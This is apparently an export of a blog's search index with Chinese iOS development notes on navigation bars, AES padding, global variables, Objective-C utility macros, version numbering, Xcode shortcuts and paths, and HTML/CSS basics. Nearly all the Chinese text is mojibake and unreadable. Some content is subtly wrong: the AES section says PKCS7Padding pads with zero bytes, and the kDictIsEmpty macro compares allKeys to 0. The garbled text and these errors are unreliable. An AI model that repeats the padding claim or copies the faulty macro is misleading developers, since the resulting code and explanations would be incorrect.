ï¼ˆç¼ºç‚¹ï¼šæ»‘åŠ¨è¿”å›žæ—¶å€™å¯ä»¥çœ‹è§è¿‡åº¦ä¸åè°ƒï¼Œåˆ‡æ¢ä¸»é¢˜å¦‚æžœæ¢å¯¼èˆªæ é¢œè‰²ä¹Ÿä¸åè°ƒï¼‰ åœ¨ViewWillAppearæ–¹æ³•è®¾ç½®å¯¼èˆªæ éšè— åœ¨ViewWillDisappearæ–¹æ³•è®¾ç½®å¯¼èˆªæ å‡ºçŽ°ï¼ˆé˜²æ­¢pushçš„å…¶ä»–æŽ§åˆ¶å™¨å¯¼èˆªæ ä¹Ÿè¢«éšè—ï¼‰ æ–¹æ³•2 ï¼ˆæŽ¨èï¼‰ éœ€è¦éšè—å¯¼èˆªæ çš„æŽ§åˆ¶å™¨éµå¾ª UINavigationControllerDelegate éœ€è¦éšè—å¯¼èˆªæ çš„æŽ§åˆ¶å™¨è®¾ç½®ä»£ç† self.navigationController.delegate = self; éœ€è¦éšè—å¯¼èˆªæ çš„æŽ§åˆ¶å™¨ å®žçŽ°ä»£ç†æ–¹æ³• 1234567// è®¾ç½®å¯¼èˆªæ æŽ§åˆ¶å™¨éšè—- (void)navigationController:(UINavigationController *)navigationController willShowViewController:(UIViewController *)viewController animated:(BOOL)animated &#123;// åˆ¤æ–­è¦æ˜¾ç¤ºçš„æŽ§åˆ¶å™¨æ˜¯å¦æ˜¯è‡ªå·±BOOL isLoginVC = [viewController isKindOfClass:[self class]];[self.navigationController setNavigationBarHidden:isLoginVC animated:YES];&#125; å¯¼èˆªæ è®¾ç½®èƒŒæ™¯é¢œè‰²ä¸ºçº¯è‰²æŠ€å·§ å¯¼èˆªæ é»˜è®¤æ˜¯ä¸èƒ½è®¾ç½®ä¸ºçº¯è‰²çš„ï¼Œå› ä¸ºç³»ç»Ÿä¼šè‡ªåŠ¨çš„åŠ ä¸Šä¸€ä¸ªä¸é€æ˜Žåº¦ï¼Œæ‰€ä»¥éœ€è¦ç”¨çº¯è‰²æ¸²æŸ“ä¸€å¼ èƒŒæ™¯å›¾ç„¶åŽè®¾ç½®èƒŒæ™¯å›¾ç‰‡å°±å¯ä»¥äº†ã€‚ è®¾ç½®å¯¼èˆªæ èƒŒæ™¯å›¾ç‰‡ï¼Œå¦‚æžœæœ‰å¯ä»¥ä¸Šä¸‹æ»šåŠ¨çš„è§†å›¾å¯èƒ½ä¸Šä¸‹è¾¹è·å°±ä¼šå˜åŒ–ï¼Œéœ€è¦åŠ å‡ç›¸åº”å†™å¯¼èˆªæ é«˜åº¦çš„å†…è¾¹è·ã€‚ AES åŠ å¯†æ¨¡å¼åŠå¡«å……æ–¹å¼ PKCS7Padding ï¼šç¼ºå‡ ä¸ªå­—èŠ‚å°±è¡¥å‡ ä¸ªå­—èŠ‚çš„0 PKCS5Padding ï¼šç¼ºå‡ ä¸ªå­—èŠ‚å°±è¡¥å……å‡ ä¸ªå­—èŠ‚çš„å‡ ï¼Œæ¯”å¦‚ç¼º7ä¸ªå­—èŠ‚ï¼Œå°±è¡¥å……7ä¸ªå­—èŠ‚çš„7 å…¨å±€å˜é‡çš„è®¾ç½®æ–¹æ³• ä½¿ç”¨UserDefualt å®žçŽ°APPå…¨å±€å˜é‡ åœ¨AppDelegateä¸­å£°æ˜Žå¹¶åˆå§‹åŒ–å…¨å±€å˜é‡ã€ç„¶åŽåœ¨éœ€è¦ä½¿ç”¨è¯¥å˜é‡çš„åœ°æ–¹æ’å…¥å¦‚ä¸‹çš„ä»£ç ï¼š 123//å–å¾—AppDelegateï¼Œåœ¨iOSä¸­ï¼ŒAppDelegatè¢«è®¾è®¡æˆäº†å•ä¾‹æ¨¡å¼ AppDelegate *appDelegate = [[UIApplication sharedApplication] delegate];appDelegate.Your Variable ä½¿ç”¨ extern å…³é”®å­— æ–°å»ºConstants.hæ–‡ä»¶ï¼ˆæ–‡ä»¶åæ ¹æ®éœ€è¦è‡ªå·±å–ï¼‰ï¼Œç”¨äºŽå­˜æ”¾å…¨å±€å˜é‡ åœ¨Constants.hä¸­å†™å…¥ä½ éœ€è¦çš„å…¨å±€å˜é‡åï¼Œ ä¾‹å¦‚ï¼š NSString *url;//æŒ‡é’ˆç±»åž‹ int count; //éžæŒ‡é’ˆç±»åž‹ æ³¨æ„ï¼šåœ¨å®šä¹‰å…¨å±€å˜é‡çš„æ—¶å€™ä¸èƒ½åˆå§‹åŒ–ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼ åœ¨éœ€è¦ç”¨åˆ°å…¨å±€å˜é‡çš„æ–‡ä»¶ä¸­å¼•å…¥æ­¤æ–‡ä»¶ï¼š 1#import "Constants.h" ç»™å…¨å±€å˜é‡åˆå§‹åŒ–æˆ–è€…èµ‹å€¼ï¼š 12345extern NSString *url;url = [[NSString alloc] initWithFormat:@"http://www.google.com"];//æŒ‡é’ˆç±»åž‹ï¼›éœ€è¦allocï¼ˆæˆ‘è¯•è¿‡ç›´æŽ¥ url = @"www.google.com" å¥½åƒä¹Ÿèƒ½è®¿é—® ï¼‰extern int count;count = 0;//éžæŒ‡é’ˆç±»åž‹ 3.5 ä½¿ç”¨å…¨å±€å˜é‡ï¼šå’Œä½¿ç”¨æ™®é€šå˜é‡ä¸€æ ·ä½¿ç”¨ã€‚ æ€§èƒ½ä¼˜åŒ–æŠ€å·§ åœ¨å¾ªçŽ¯é‡Œé¢å­˜åœ¨å¤§é‡ä¸´æ—¶å˜é‡ï¼Œéœ€è¦æ‰‹åŠ¨é‡Šæ”¾å†…å­˜ï¼Œä¼˜åŒ–å¯¼è‡´å†…å­˜çš„æš´å¢žå¸¦æ¥çš„é—ªé€€é—®é¢˜ã€‚ 12345678for (int i = 0; i&lt;1000000; i++) &#123; @autoreleasepool &#123; NSString *str = @"ABc"; NSString *string = [str lowercaseString]; string = [string stringByAppendingString:@"xyz"]; NSLog(@"%@",string); &#125;&#125; å‚è€ƒ é˜²æ­¢æŠŠçº¿ä¸‹ç‰ˆæœ¬æ‰“åŒ…ä¸Šä¼ å‘å¸ƒAppStoreçš„æŽªæ–½ åœ¨Target -&gt; Build Setting é‡Œé¢æœç´¢Skip Install å°†ReleaseçŽ¯å¢ƒä»¥å¤–çš„Skip Installé…ç½®æˆNOï¼Œå°±ä¸ä¼šArchiveå‡ºipaåŒ… OpenSSL è½¬è¯ä¹¦æ ¼å¼1234// .crt è½¬ .ceropenssl x509 -in ca.crt -out certificate.cer -outform der// .crt è½¬ .deropenssl x509 -in ca.crt -out certificate.der -outform der Shadowrocket çŠ¶æ€æ ä¸æ˜¾ç¤ºVPN è§£å†³æ–¹æ³• Shadowrocket--Stettings--Config--LOCAL FILESé‡Œï¼Œç‚¹ä½¿ç”¨çš„é…ç½®æ–‡ä»¶å³è¾¹çš„æ„Ÿå¹å·ï¼ŒGeneralâ€“æœ€ä¸‹é¢æœ‰ä¸ªBYPASS TUN æŠŠé‡Œé¢ç¬¬ä¸€ä¸ª0.0.0.0/8åˆ æŽ‰ åˆ¶ä½œMacå¯åŠ¨Uç›˜1sudo /Applications/Install\ OS\ X\ El\ Capitan.app/Contents/Resources/createinstallmedia --volume /Volumes/USBName --applicationpath /Applications/Install\ OS\ X\ El\ Capitan.app --nointeraction]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>ç¢Žç‰‡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘ä¸­å¸¸ç”¨å‘çš„å®å®šä¹‰]]></title>
    <url>%2Farchives%2F9f7da62.html</url>
    <content type="text"><![CDATA[å°‘å¹´ä¸Šäººå·æ€€ç´ ï¼Œè‰ä¹¦å¤©ä¸‹ç§°ç‹¬æ­¥ã€‚å¢¨æ± é£žå‡ºåŒ—æºŸé±¼ï¼Œç¬”é”‹æ€å°½ä¸­å±±å…”ã€‚å…«æœˆä¹æœˆå¤©æ°”å‡‰ï¼Œé…’å¾’è¯å®¢æ»¡é«˜å ‚ã€‚ç¬ºéº»ç´ ç»¢æŽ’æ•°åŽ¢ï¼Œå®£å·žçŸ³ç šå¢¨è‰²å…‰ã€‚å¾å¸ˆé†‰åŽå€šç»³åºŠï¼Œé¡»è‡¾æ‰«å°½æ•°åƒå¼ ã€‚é£˜é£Žéª¤é›¨æƒŠé£’é£’ï¼Œè½èŠ±é£žé›ªä½•èŒ«èŒ«ã€‚èµ·æ¥å‘å£ä¸åœæ‰‹ï¼Œä¸€è¡Œæ•°å­—å¤§å¦‚æ–—ã€‚æ€³æ€³å¦‚é—»ç¥žé¬¼æƒŠï¼Œæ—¶æ—¶åªè§é¾™è›‡èµ°ã€‚å·¦ç›˜å³è¹™å¦‚æƒŠç”µï¼ŒçŠ¶åŒæ¥šæ±‰ç›¸æ”»æˆ˜ã€‚æ¹–å—ä¸ƒéƒ¡å‡¡å‡ å®¶ï¼Œå®¶å®¶å±éšœä¹¦é¢˜éã€‚çŽ‹é€¸å°‘ï¼Œå¼ ä¼¯è‹±ï¼Œå¤æ¥å‡ è®¸æµªå¾—åã€‚å¼ é¢ è€æ­»ä¸è¶³æ•°ï¼Œæˆ‘å¸ˆæ­¤ä¹‰ä¸å¸ˆå¤ã€‚å¤æ¥ä¸‡äº‹è´µå¤©ç”Ÿï¼Œä½•å¿…è¦å…¬å­™å¤§å¨˜æµ‘è„±èˆžã€‚ â€”â€”æŽç™½ ã€Šè‰ä¹¦æ­Œè¡Œã€‹ å¸¸ç”¨çš„å®å®šä¹‰æ–‡ä»¶123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778// åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦ä¸ºç©º#define kStringIsEmpty(str) ([str isKindOfClass:[NSNull class]] || str == nil || [str length] &lt; 1 ? YES : NO )// åˆ¤æ–­æ•°ç»„æ˜¯å¦ä¸ºç©º#define kArrayIsEmpty(array) (array == nil || [array isKindOfClass:[NSNull class]] || array.count == 0)// åˆ¤æ–­å­—å…¸æ˜¯å¦ä¸ºç©º#define kDictIsEmpty(dic) (dic == nil || [dic isKindOfClass:[NSNull class]] || dic.allKeys == 0)// åˆ¤æ–­å¯¹è±¡æ˜¯å¦ä¸ºç©º#define kObjectIsEmpty(_object) (_object == nil \ || [_object isKindOfClass:[NSNull class]] \ || ([_object respondsToSelector:@selector(length)] &amp;&amp; [(NSData *)_object length] == 0) \ || ([_object respondsToSelector:@selector(count)] &amp;&amp; [(NSArray *)_object count] == 0))// ä¸€äº›ç¼©å†™#define kApplication [UIApplication sharedApplication]#define kKeyWindow [UIApplication sharedApplication].keyWindow#define kAppDelegate [UIApplication sharedApplication].delegate#define kUserDefaults [NSUserDefaults standardUserDefaults]#define kNotificationCenter [NSNotificationCenter defaultCenter]// Appç‰ˆæœ¬å·åŠåç§°#define kAppVersion [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleShortVersionString"]#define kAppDisplayName [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"]// åŒºåˆ†ä¸åŒè¯­è¨€å¯¼å…¥çš„å¤´æ–‡ä»¶#ifdef __OBJC__#import &lt;UIKit/UIKit.h&gt;#import &lt;Foundation/Foundation.h&gt;#import "XSConst.h"#endif// åŒºåˆ†ä¸åŒçŽ¯å¢ƒæŽ¥å£#ifdef DEBUG // è°ƒè¯•çŠ¶æ€, æ‰“å¼€LOGåŠŸèƒ½#define XSLog(...) NSLog(__VA_ARGS__)#define XSKYDWAPIURL @"your_server_debug_url"#define XSKYDWImageAPIURL @"your_server_debug_url"#else // å‘å¸ƒçŠ¶æ€, å…³é—­LOGåŠŸèƒ½#define XSLog(...)#define XSKYDWAPIURL @"your_server_release_url"#define XSKYDWImageAPIURL @"your_server_release_url"#endif// æ‰“å°æ–¹æ³•è°ƒç”¨#define XSLogFuc XSLog(@"%s", __func__);// é¢œè‰²è®¾ç½®#define XSColor(r, g, b) [UIColor colorWithRed:(r)/255.0 green:(g)/255.0 blue:(b)/255.0 alpha:1]// æœ‰é€æ˜Žåº¦çš„é¢œè‰²#define XSColorA(r, g, b, a) [UIColor colorWithRed:(r)/255.0 green:(g)/255.0 blue:(b)/255.0 alpha:(a)/255.0]// ç°è‰²#define XSGrayColor(value) XSColor(value, value, value)// å…¨å±€ç°è‰²#define XSCommonBgColor XSGrayColor(238)// æ ‡ç­¾çš„èƒŒæ™¯é¢œè‰²#define XSTagBgColor XSColor(70, 142, 243)// éšæœºè‰²#define XSRandomColor [UIColor colorWithRed:arc4random_uniform(256)/255.0 green:arc4random_uniform(256)/255.0 blue:arc4random_uniform(256)/255.0 alpha:1.0]// å±å¹•çš„å®½é«˜#define kSScreenW [UIScreen mainScreen].bounds.size.width#define kSScreenH [UIScreen mainScreen].bounds.size.height// åˆ¤æ–­ç³»ç»Ÿçš„ç‰ˆæœ¬#define iOS7 ([[UIDevice currentDevice].systemVersion doubleValue] &gt;= 7.0)#define iOS8 ([[UIDevice currentDevice].systemVersion doubleValue] &gt;= 8.0)#define iOS9 ([[UIDevice currentDevice].systemVersion doubleValue] &gt;= 9.0)// ä¸ºäº†è§£æžæœåŠ¡å™¨è¿”å›žçš„æ•°æ® å†™åˆ°pilstæ–‡ä»¶é‡Œé¢çœ‹æ›´æ¸…æ™°#define XSWriteToPlist(obj, filename) [obj writeToFile:[NSString stringWithFormat:@"/Users/user11-kydw/Desktop/%@.plist", filename] atomically:YES];// æ¶ˆé™¤è°ƒç”¨performSelectoråœ¨ARCä¸‹çš„è­¦å‘Š ï¼ˆç³»ç»Ÿæ— æ³•ç¡®å®šè¿”å›žå€¼ç±»åž‹ï¼‰#define SuppressPerformSelectorLeakWarning(Stuff) \do &#123; \_Pragma("clang diagnostic push") \_Pragma("clang diagnostic ignored \"-Warc-performSelector-leaks\"") \Stuff; \_Pragma("clang diagnostic pop") \&#125; while (0)]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>App Version</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å…³äºŽAppç‰ˆæœ¬å·å‘½åè§„åˆ™]]></title>
    <url>%2Farchives%2F4edead15.html</url>
    <content type="text"><![CDATA[ä¸¤äººå¯¹é…Œå±±èŠ±å¼€ï¼Œä¸€æ¯ä¸€æ¯å¤ä¸€æ¯ã€‚æˆ‘é†‰æ¬²çœ å¿ä¸”åŽ»ï¼Œæ˜Žæœæœ‰æ„æŠ±ç´æ¥ã€‚ â€”â€”æŽç™½ ã€Šå±±ä¸­ä¸Žå¹½äººå¯¹é…Œã€‹ é¡¹ç›®ä¸­Appå‘å¸ƒç‰ˆæœ¬ç»Ÿä¸€å¤„ç†ä¸ºäº†ç»Ÿä¸€iOSå’Œå®‰å“ä¸¤ä¸ªå¹³å°çš„å‘å¸ƒç‰ˆæœ¬ä¸ä¼šäº§ç”Ÿæ··ä¹±ã€‚å®šä¹‰ç‰ˆæœ¬å·ä¿¡æ¯ä¸ºå¦‚ä¸‹æ ¼å¼ï¼šä¸»ç‰ˆæœ¬å·.æ¬¡ç‰ˆæœ¬å·.ä¿®è®¢ç‰ˆæœ¬å· eg : 2.0.0 ä¸»ç‰ˆæœ¬å·ï¼šæŽ¥å£åšäº†ä¸æ”¯æŒå‘ä¸‹å…¼å®¹çš„æ›´æ”¹æˆ–è€…ç•Œé¢é‡æž„ï¼Œå‡çº§ä¸»ç‰ˆæœ¬å·ï¼› æ¬¡ç‰ˆæœ¬å·ï¼šåšäº†åŠŸèƒ½æ€§å‡çº§ï¼Œæ”¯æŒå‘ä¸‹å…¼å®¹ï¼Œè€ç‰ˆæœ¬ä¾ç„¶æ­£å¸¸ä½¿ç”¨ï¼› ä¿®è®¢å·ï¼šåšé—®é¢˜ä¿®æ­£ï¼Œé€šå¸¸ä¿®å¤å·²çŸ¥é—®é¢˜ï¼ˆå„è‡ªç»´æŠ¤ï¼‰ 1.0.0 // ç¬¬ä¸€æ¬¡å‘å¸ƒç‰ˆæœ¬ 1.0.1 // å„è‡ªçš„ç»´æŠ¤çš„ä¿®å¤bugç‰ˆæœ¬ â€¦ 1.1.0 // æ­£å¸¸è¿­ä»£å’Œæ–°åŠŸèƒ½æ·»åŠ ç‰ˆæœ¬ (ç»Ÿä¸€) â€¦ 2.0.0 // æ­£å¸¸è¿­ä»£å’Œé‡å¤§æ”¹ç‰ˆç‰ˆæœ¬ ï¼ˆéœ€è¦ï¼‰ â€¦]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>App Version</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘å·¥å…·Xcodeå¿«æ·é”®åŠç›¸å…³çŸ¥è¯†æ•´ç†]]></title>
    <url>%2Farchives%2Ffd0d6f33.html</url>
    <content type="text"><![CDATA[çŠ¬å æ°´å£°ä¸­ï¼Œæ¡ƒèŠ±å¸¦é›¨æµ“ã€‚æ ‘æ·±æ—¶è§é¹¿ï¼Œæºªåˆä¸é—»é’Ÿã€‚é‡Žç«¹åˆ†é’éœ­ï¼Œé£žæ³‰æŒ‚ç¢§å³°ã€‚æ— äººçŸ¥æ‰€åŽ»ï¼Œæ„å€šä¸¤ä¸‰æ¾ã€‚ â€”â€”æŽç™½ ã€Šè®¿æˆ´å¤©å±±é“å£«ä¸é‡ã€‹ Xcodeå¸¸ç”¨å¿«æ·é”® Option + shift + K æ‰“å‡ºAppleçš„logo ï£¿ Command + option + Enter æ‹–çº¿çš„æ—¶å€™å¿«é€Ÿåˆ‡æ¢åˆ°ç›¸åº”çš„ç•Œé¢ Command + Enter æ ‡å‡†ç•Œé¢ Command + option + å·¦ç®­å¤´ æŠ˜å ä»£ç å— Command + option + å³ç®­å¤´ æ‰“å¼€ä»£ç å— Command + option + shift + å·¦ç®­å¤´ æŠ˜å å…¨éƒ¨ä»£ç å— Command + option + shift + å³ç®­å¤´ æ‰“å¼€å…¨éƒ¨ä»£ç å— Command + option + ï¼Œå¿«é€Ÿåˆ†å± Command + shift + ï¼Œæ‰“å¼€schemeçš„ç•Œé¢ Command + shift + O å¿«é€ŸæŸ¥æ‰¾æ–‡ä»¶ä½ç½® Command + shift + J å¿«é€Ÿå®šä½è·³è½¬åˆ°æŸ¥æ‰¾çš„æ–‡ä»¶çš„ä½ç½® Command + control + ä¸Šä¸‹æ–¹å‘é”® å¿«é€Ÿåˆ‡è®°.h .mæ–‡ä»¶ Command + Option+ 0 æ˜¾ç¤º/éšè—å·¦è¾¹å®žç”¨å·¥å…·é¢æ¿ Control + 6 åˆ—å‡ºå½“å‰æ–‡ä»¶ä¸­çš„æ–¹æ³• Control + 1 åˆ‡æ¢åˆ°Project Navigator Command + Control + Left/right åˆ‡æ¢åˆ°ä¸Šæ¬¡ç¼–è¾‘çš„ä½ç½® Control + i é€‰ä¸­ä»£ç å·¦å¯¹é½ Xcodeä¸­ç”¨çš„æ’ä»¶ Alcatraz ä¸€ä¸ªæ’ä»¶ç®¡ç†å¹³å°ï¼Œä¸‹è½½å’Œç§»é™¤æ’ä»¶ VVDocumenter ç»å…¸çš„æ³¨é‡Šæ’ä»¶ FuzzyAutocomplete ä»£ç è¡¥å…¨æ”¯æŒæ¨¡ç³ŠæŸ¥è¯¢ KSImageNamed å›¾ç‰‡æç¤ºæ’ä»¶ï¼ˆXcode8å¯ä»¥ä¸ç”¨äº†ï¼Œé»˜è®¤è‡ªå¸¦ ä»…é™swiftï¼‰ Backlight å½“å‰ç¼–è¾‘ä½ç½®é«˜äº®æ˜¾ç¤º ï¼ˆXcode8å¯ä»¥ä¸ç”¨äº†ï¼Œé»˜è®¤è‡ªå¸¦ï¼‰ Cocoapods ç®¡ç†ä¸‰æ–¹åº“çš„æ’ä»¶ã€ç‰¹åˆ«å®žç”¨ ColorSense é¢œè‰²æç¤ºæ’ä»¶ã€è¿˜å¯ä»¥è¾“å…¥é¢œè‰²æ—¶æœ‰ä¸€ä¸ªè‰²æ¿ç»™ä½ é€‰ å®‰è£…å®Œé»˜è®¤æ²¡æœ‰æ•ˆæžœï¼Œéœ€è¦åœ¨Xcode-Edité‡Œé¢è®¾ç½®æ˜¾ç¤ºæ–¹å¼åŠé¢œè‰²ï¼ˆæˆ‘é…ç½®çš„é¢œè‰²R:127 G: 127 B:121 Opacity:45% Hex Color : #7F7F79ï¼‰ XToDo å¿«æ·é”®æ ‡è®°ï¼Œå’Œç»Ÿä¸€æŸ¥çœ‹ ActivatePowerMode æ•²ä»£ç æ—¶å±å¹•æŠ–åŠ¨ç«èŠ±è¿¸æº…æ•ˆæžœ è£…é€¼æ’ä»¶ã€æ— èŠçš„æ—¶å€™çŽ©ï¼Œè¿™ä¸ªæ˜¯å¸¦å£°éŸ³ç‰¹æ•ˆçš„ï¼Œï¼ˆXActivatePowerModeè¿™ä¸ªæ•ˆæžœç±»ä¼¼ã€ä¸å¸¦å£°éŸ³ç‰¹æ•ˆï¼‰ Xcode8 æ³¨é‡Š Command + / å¤±æ•ˆè§£å†³åŠžæ³• ç»ˆç«¯æ‰§è¡Œä¸‹é¢ä»£ç ï¼Œç„¶åŽé‡å¯ç”µè„‘ 1~ sudo /usr/libexec/xpccachectl ä½Žç‰ˆæœ¬XCodeä¸æ”¯æŒé«˜ç‰ˆæœ¬iOSç³»ç»Ÿè¿›è¡ŒçœŸæœºè°ƒè¯•è§£å†³æ–¹æ¡ˆ è¿™ä¸ªç›®å½•ä¸‹æœ‰å½“å‰Xcodeæ‰€æ”¯æŒçš„æ‰€æœ‰çœŸæœºç³»ç»Ÿ æŠŠæœ€æ–°çš„Xcodeé‡Œé¢çš„æœ€æ–°çš„æ–‡ä»¶æ‹·è´åˆ°ä½Žç‰ˆæœ¬Xcodeé‡Œé¢ 1/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/DeviceSupport è¿™ä¸ªæ–‡ä»¶æœ‰æ”¯æŒçš„SDKåŒ… æŠŠæœ€æ–°çš„Xcodeé‡Œé¢çš„æœ€æ–°çš„åŒ…æ‹·è´åˆ°ä½Žç‰ˆæœ¬çš„Xcodeé‡Œé¢ 1/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/ æ“ä½œçš„æ—¶å€™å°½é‡é€€å‡ºXcodeï¼Œå¦‚æžœå®Œæˆä»¥ä¸Šä¸¤æ­¥è¿˜æ˜¯ä¸èƒ½çœŸæœºè°ƒè¯•çš„è¯å°±é‡å¯ç”µè„‘ã€‚ å¸¸è§æ–‡ä»¶è·¯å¾„ Xcodeå­—ä½“æ‰€åœ¨è·¯å¾„ï¼ˆæå–Xcode8æœ€æ–°å­—ä½“ï¼š San Francisco Mono ï¼‰å¤åˆ¶åˆ°å…¶ä»–ç‰ˆæœ¬Xcodeä¸­ï¼Œæˆ‘å¾—ç”µè„‘éœ€è¦åˆ‡æ¢è‹±è¯­é‡å¯ç”µè„‘æ‰å¯ä»¥é€‰åˆ° 1/Applications/Xcode.app/Contents/SharedFrameworks/DVTKit.framework/Versions/A/Resources/Fonts Xcodeæè¿°æ–‡ä»¶è·¯å¾„ 1~/Library/MobileDevice/Provisioning Profiles Xcodeè‡ªå¸¦å¤´æ–‡ä»¶çš„è·¯å¾„ 1/Xcode/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/SDKs/iPhoneSimulator.sdk/System/Library/Frameworks/UIKit.framework/Headers ä¿®æ”¹äº†ç³»ç»Ÿè‡ªå¸¦å¤´æ–‡ä»¶åŽ,Xcodeä¼šæŠ¥é”™è§£å†³æ–¹æ¡ˆ:åˆ æŽ‰ä¸‹é¢æ–‡ä»¶å¤¹çš„ç¼“å­˜å³å¯(aplleæ˜¯ç”µè„‘çš„ç”¨æˆ·å) 1/Users/smile/Library/Developer/Xcode/DerivedData æˆ–è€… 1/Users/smile/Library/Developer/Xcode/DerivedData Xcodeçš„è‡ªå®šä¹‰ä»£ç å—çš„ä½ç½® 1/Users/smile/Library/Developer/Xcode/UserData/CodeSnippets Xcode æ–‡æ¡£çš„ä½ç½® 1/Applications/Xcode.app/Contents/Developer/Documentation/DocSets æ’ä»¶çš„ä½ç½® 1/Users/smile/Library/Application Support/Developer/Shared/Xcode/Plug-ins æ²™ç›’çš„ä½ç½® 1/Users/smile/Library/Developer/CoreSimulator/Devices/(æ–‡ä»¶åç§° æŒ‰æ—¶é—´æŽ’åºæ‰¾)/data/Containers/Data/Application æ¨¡æ‹Ÿå™¨å®‰è£…ä½ç½® 1234// æ²¡æœ‰/Profiles/Runtimes è¿™ä¸¤ä¸ªæ–‡ä»¶å¤¹çš„è¯ æ‰‹åŠ¨åˆ›å»º/Library/Developer/CoreSimulator/Profiles/Runtimes/Users/smile/Library/Developer/CoreSimulator/Profiles/Runtimes]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>ç¢Žç‰‡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘ä¹‹ç½‘é¡µçš„åŸºæœ¬æ¦‚å¿µ]]></title>
    <url>%2Farchives%2F371821f9.html</url>
    <content type="text"><![CDATA[ä¸–é—´èŠ±å¶ä¸ç›¸ä¼¦ï¼ŒèŠ±å…¥é‡‘ç›†å¶ä½œå°˜ã€‚æƒŸæœ‰ç»¿è·çº¢è¡èï¼Œå·èˆ’å¼€åˆä»»å¤©çœŸã€‚æ­¤èŠ±æ­¤å¶å¸¸ç›¸æ˜ ï¼Œç¿ å‡çº¢è¡°æ„æ€äººã€‚ æŽå•†éš ã€Šèµ è·èŠ±ã€‹ ç½‘é¡µçš„ç»„æˆ ä¸€ä¸ªæœ‰å…·ä½“åŠŸèƒ½çš„å®Œæ•´çš„ç½‘é¡µï¼Œä¸€èˆ¬ç”±3éƒ¨åˆ†ç»„æˆ HTMLï¼šç½‘é¡µçš„å…·ä½“å†…å®¹å’Œç»“æž„ã€‚ CSSï¼šç½‘é¡µçš„æ ·å¼ï¼ˆç¾ŽåŒ–ç½‘é¡µæœ€é‡è¦çš„ä¸€å—ï¼‰ã€‚ JavaScriptï¼šç½‘é¡µçš„äº¤äº’æ•ˆæžœï¼Œæ¯”å¦‚å¯¹ç”¨æˆ·é¼ æ ‡äº‹ä»¶åšå‡ºå“åº”ã€‚ HTML\CSS\JavaScriptå­¦ä¹ èµ„æ–™åœ¨è¿™é‡Œã€‚ HTMLçš„å…¨ç§°æ˜¯HyperText Markup Languageï¼Œè¶…æ–‡æœ¬æ ‡è®°è¯­è¨€ï¼Œå…¶å®žå®ƒå°±æ˜¯æ–‡æœ¬ï¼Œç”±æµè§ˆå™¨è´Ÿè´£å°†å®ƒè§£æžæˆå…·ä½“çš„ç½‘é¡µå†…å®¹ã€‚ HTMLHTMLçš„ç»„æˆ è·ŸXMLç±»ä¼¼ï¼ŒHTMLç”±Nä¸ªæ ‡ç­¾ï¼ˆèŠ‚ç‚¹ã€å…ƒç´ ã€æ ‡è®°ï¼‰ç»„æˆ HTMLè¯­æ³•éžå¸¸æ¾æ•£ï¼Œç›®å‰çš„æœ€æ–°ç‰ˆæ˜¯5.0ï¼Œä¹Ÿå°±æ˜¯HTML5 å¸¸è§çš„HTMLæ ‡ç­¾123456789æ ‡é¢˜ï¼šh1ã€h2ã€h3ã€h4ã€h5....æ®µè½ï¼špæ¢è¡Œï¼šbrå®¹å™¨ï¼šdivã€spanï¼ˆç”¨æ¥å®¹çº³å…¶ä»–æ ‡ç­¾ï¼‰è¡¨æ ¼ï¼štableã€trã€tdåˆ—è¡¨ï¼šulã€olã€liå›¾ç‰‡ï¼šimgè¡¨å•ï¼šinputé“¾æŽ¥ï¼ša CSS CSSçš„å…¨ç§°æ˜¯Cascading Style Sheetsï¼Œå±‚å æ ·å¼è¡¨ã€‚ å®ƒç”¨æ¥æŽ§åˆ¶HTMLæ ‡ç­¾çš„æ ·å¼ï¼Œåœ¨ç¾ŽåŒ–ç½‘é¡µä¸­èµ·åˆ°éžå¸¸é‡è¦çš„ä½œç”¨ã€‚ CSSçš„ç¼–å†™æ ¼å¼æ˜¯é”®å€¼å¯¹å½¢å¼çš„ï¼Œæ¯”å¦‚ï¼š å†’å·:å·¦è¾¹çš„æ˜¯å±žæ€§åï¼Œå†’å·:å³è¾¹çš„å±žæ€§å€¼ 123color: red;background-color: blue;font-size: 20px; CSSçš„3ç§ä¹¦å†™å½¢å¼ CSSæœ‰3ç§ä¹¦å†™å½¢å¼ï¼ˆä¼˜å…ˆçº§ä»Žé«˜åˆ°ä½Žï¼‰ 123456789101112è¡Œå†…æ ·å¼ï¼šï¼ˆå†…è”æ ·å¼ï¼‰ç›´æŽ¥åœ¨æ ‡ç­¾çš„styleå±žæ€§ä¸­ä¹¦å†™&lt;body style="color: red;"&gt;å†…é¡µæ ·å¼ï¼šåœ¨æœ¬ç½‘é¡µçš„styleæ ‡ç­¾ä¸­ä¹¦å†™&lt;style type="text/css"&gt; body &#123; color: red; &#125;&lt;/style&gt;å¤–éƒ¨æ ·å¼ï¼šåœ¨å•ç‹¬çš„CSSæ–‡ä»¶ä¸­ä¹¦å†™ï¼Œç„¶åŽåœ¨ç½‘é¡µä¸­ç”¨linkæ ‡ç­¾å¼•ç”¨&lt;link type="text/css" rel="stylesheet" href="index.css"&gt; HTML + CSS èƒ½çœ‹åˆ°æ ‡ç­¾çš„ç»“æž„ 1234567* çˆ¶å­å…³ç³»&lt;p&gt; &lt;span&gt;123&lt;/span&gt;&lt;/p&gt;* å±žæ€§&lt;img src="images/01.png"&gt; äº†è§£å…ƒç´ ï¼ˆæ ‡ç­¾ï¼‰çš„ç±»åž‹ blockï¼šå—çº§ ç‹¬å ä¸€è¡Œ 